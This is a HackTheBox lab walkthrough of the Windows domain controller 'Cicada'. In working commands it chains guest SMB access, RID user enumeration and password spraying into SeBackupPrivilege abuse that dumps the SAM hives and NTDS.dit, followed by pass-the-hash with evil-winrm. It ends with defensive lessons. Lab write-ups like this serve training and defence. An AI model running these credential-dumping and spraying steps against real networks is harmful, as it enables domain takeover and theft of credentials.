---
title: "Cicada — HackTheBox Walkthrough"
description: "Guest SMB access leaking a default password, a spray into the domain, and SeBackupPrivilege abuse to dump the Administrator NTLM hash for pass-the-hash."
date: 2026-09-22
category: offensive
readTime: "10 min read"
mitre:
  - "T1046"
  - "T1135"
  - "T1087.002"
  - "T1110.003"
  - "T1552.001"
  - "T1021.006"
  - "T1003.002"
  - "T1550.002"
  - "T1078"
tags:
  - "HackTheBox"
  - "HTB"
  - "CPTS"
  - "Windows"
  - "Active Directory"
  - "SMB"
  - "LDAP"
  - "Password Spraying"
  - "SeBackupPrivilege"
  - "Pass-the-Hash"
  - "WinRM"
summary: "Guest SMB access leaking a default password, a spray into the domain, and SeBackupPrivilege abuse to dump the Administrator NTLM hash for pass-the-hash."
---

**Machine:** Cicada
**OS:** Windows (Server 2022 — Domain Controller)
**Difficulty:** Easy
**Key Techniques:** guest SMB access, credential hunting, RID user enumeration, password spraying, AD description leak, `SeBackupPrivilege`, SAM/SYSTEM hive dump, pass-the-hash

---

## Reconnaissance

### Port Scan

```bash
nmap -sC -sV -p- -oA scans/nmap-alltcp 10.10.11.35
```

| Port | Service | Version / Note |
|------|---------|----------------|
| 53 | DNS | Simple DNS Plus |
| 88 | Kerberos | Microsoft Windows Kerberos |
| 135 / 139 / 445 | MSRPC / NetBIOS / SMB | NetBIOS-SSN, microsoft-ds |
| 464 | kpasswd5 | |
| 593 | ncacn_http | MSRPC over HTTP |
| 636 / 3268 / 3269 | LDAPS / LDAP / GC | Domain: cicada.htb |
| 5985 | HTTP | WinRM (Microsoft HTTPAPI) |

Classic domain controller profile: Kerberos + LDAP + SMB + WinRM. The scan leaks the hostname `CICADA-DC` and domain. Add the mapping so Kerberos/LDAP tooling resolve cleanly:

```bash
echo "10.10.11.35 cicada.htb" | sudo tee -a /etc/hosts
```

---

## Enumeration

### SMB — Guest Access to the HR Share

Anonymous SMB is refused, but the `guest` account gets a browse list:

```bash
crackmapexec smb cicada.htb --shares                          # access denied
crackmapexec smb cicada.htb -u guest -p '' --shares           # READ on HR
```

Connect to `HR` and pull the only file:

```bash
smbclient //cicada.htb/HR
smb: \> dir
smb: \> get "Notice from HR.txt"
```

The notice is a new-hire email that contains the default onboarding password:

```
Welcome to Cicada Corp! ... it's essential that you change your default
password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8
```

> MITRE: Network Share Discovery (T1135), Unsecured Credentials — Credentials In Files (T1552.001).

### Enumerating Domain Users

We have a password but no username. Vision: enumerate every RID-referenced account over SMB through the guest session with `lookupsid`:

```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass \
  | grep 'SidTypeUser' \
  | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
```

This yields the real human accounts, including `john.smoulder`, `sarah.dantelia`, `michael.wrightson`, `david.orelious`, and `emily.oscars`.

### Password Spraying

Spray the HR default password against every user we found:

```bash
crackmapexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

One hit: **`michael.wrightson`** never changed his onboarding password.

> MITRE: Account Discovery (T1087.002), Password Spraying (T1110.003).

---

## Foothold — Chaining Credentials to Lateral Movement

### The AD Description Field Leaks Another Password

With valid credentials we can pull every user's AD attributes. The `description` field is a surprisingly common password storage location:

```bash
crackmapexec smb cicada.htb \
  -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

**`david.orelious`** has his password sitting in his AD description: `aRt$Lp#7t*VQ!3`.

### David's DEV Share Hides a Script with Emily's Credentials

Check what David can reach:

```bash
crackmapexec smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
smb: \> get Backup_script.ps1
```

The backup script hardcodes a domain account in plaintext via `ConvertTo-SecureString`:

```powershell
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
```

That's `converted-to-plaintext` for a reason — the string is recoverable by anyone who can read the file (MITRE T1552.001). Emily's account also has `ADMIN$` access, so we go straight to WinRM:

```bash
evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

```
cd ..\Desktop
cat user.txt
```

User flag captured. Now check our privileges:

```
whoami /priv

Privilege Name          Description                    State
--------------------    ----------------------------- --------
SeBackupPrivilege       Back up files and directories  Enabled
...
```

`SeBackupPrivilege` is the prize — it bypasses normal ACL checks on reads.

> MITRE: Valid Accounts (T1078), Unsecured Credentials (T1552.001), Windows Remote Management (T1021.006).

---

## Privilege Escalation — SeBackupPrivilege to Administrator

`SeBackupPrivilege` lets us read *any* file regardless of ACLs — including the local registry hives that hold password hashes. Because this is a DC, the local SAM contains the cached local account hashes (a DC keeps its local SAM for the "password recovery" scenario), and we can also go after `NTDS.dit` via VSS for the full domain dump.

### SAM + SYSTEM Registry Hives

```bash
reg save hklm\sam sam
reg save hklm\system system
download sam
download system
```

Extract the hashes offline:

```bash
impacket-secretsdump -sam sam -system system local
```

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
```

We now hold the local **Administrator NTLM hash**.

### NTDS.dit Alternative (Full Domain Dump)

Since `SeBackupPrivilege` is often used to grab `NTDS.dit` on a DC, the VSS-based route dumps every domain account (including `krbtgt`):

```powershell
vssadmin create shadow /for=C:
# (shadow copy volume mounted, e.g. Z:)
robocopy /b Z:\Windows\NTDS . ntds.dit
robocopy /b Z:\Windows\System32\config . SYSTEM
download ntds.dit
download SYSTEM
```

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM local
```

> MITRE: OS Credential Dumping — Security Account Manager (T1003.002) / DCSync-style NTDS extraction.

### Pass-the-Hash to root.txt

No need to crack anything — replay the hash directly:

```bash
evil-winrm -i cicada.htb -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```

```
cat root.txt
```

Root achieved.

> MITRE: Use Alternate Authentication Material — Pass-the-Hash (T1550.002).

---

## Flags

```bash
cat C:\Users\emily.oscars\Desktop\user.txt
cat C:\Users\Administrator\Desktop\root.txt
```

Flag values are unique to each HTB instance and are intentionally omitted.

---

## Lessons Learned

1. **Lock down SMB shares.** A guest-readable `HR` share handed out a default password to every new hire. Anonymous and guest access should be disabled on anything that isn't meant to be public.
2. **Default passwords never die.** The onboarding password worked on accounts months after onboarding. Enforce a change at first login, expire old defaults, and add MFA so a static credential alone isn't enough.
3. **The AD `description` field is a credentials dump.** Users and admins routinely paste passwords into it. Query your directory for descriptions, secrets in attributes, and other "helpful" fields.
4. **Never hardcode credentials in scripts left in shared locations.** `Backup_script.ps1` was the lateral-movement pivot. Use a secrets manager, managed identity, or at minimum encrypt the script directory with restricted ACLs.
5. **`SeBackupPrivilege` is local admin in disguise.** It read the SAM and enabled pass-the-hash. For defenders: audit `reg save`, `vssadmin create shadow`, and `robocopy /b` on workstations and DCs, and restrict who holds backup privileges (MITRE T1003.002 monitoring via Event IDs 5001/5004 in Sysmon and registry hive save events).